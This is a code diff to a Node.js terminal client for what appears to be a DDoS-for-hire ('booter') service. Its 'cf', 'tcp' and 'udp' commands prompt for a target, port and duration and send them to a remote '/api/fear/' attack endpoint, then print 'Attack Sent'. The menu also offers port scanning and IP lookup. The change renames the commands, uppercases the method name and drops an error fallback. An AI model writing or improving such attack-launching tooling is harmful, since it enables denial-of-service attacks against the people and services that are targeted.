@@ -15,7 +15,7 @@ function smallCase(input) {
   return input.toLowerCase();
 }
 
-let myCmds = ['.cf', '.tcp', '.udp', 'methods', 'logout', 'info', 'tos', 'iplookup', 'help', '?', 'portscan'];
+let myCmds = ['cf', 'tcp', 'udp', 'methods', 'logout', 'info', 'tos', 'iplookup', 'help', '?', 'portscan'];
 
 let methodsBanner = `
 \x1b[2J\x1b[1H\x1b[0m
@@ -100,14 +100,16 @@ function handleCommand(cmd) {
     sleep(1000).then(() => takeUserInput());
   } else {
     switch (cmd.toLowerCase()) { //whatever they put in gets converted to a lowercase string
-      case '.cf':
-      case '.tcp':
-      case '.udp':
+      case 'cf':
+      case 'tcp':
+      case 'udp':
         rl.question('TARGET: ', (target) => {
           rl.question('PORT: ', (port) => {
             rl.question('TIME: ', (time) => {
-              axios.get(`http://${API_SERVER}:3000/api/fear/?key=${token}&target=${target}&port=${port}&time=${time}&method=${cmd}`)
+              const uppercaseString = cmd.toUpperCase();
+              axios.get(`http://${API_SERVER}:3000/api/fear/?key=${token}&target=${target}&port=${port}&time=${time}&method=${cmd.toUpperCase()}`)
                 .then(rs => {
+                  console.log(uppercaseString);
                   console.log(`
                   ╔══════════════════════╗
                   ╠═══╣Attack Sent╠══════╝
@@ -201,13 +203,8 @@ function takeUserInput() {
       takeUserInput();
     } else {
       smallCaseCmd = smallCase(cmd);
-      if (myCmds.includes(smallCaseCmd)) {
+      if (myCmds.includes(smallCaseCmd))
         handleCommand(smallCaseCmd);
-      } else {
-        console.error(`[ ${cmd} ] Oops! Did You Think That Was A Command?`);
-        console.log("Let's try to see what you were typing.");
-        sleep(2000).then(() => handleCommand(smallCaseCmd)); // corrects what they were typing to lowercase string
-      }
     }
   });
 }
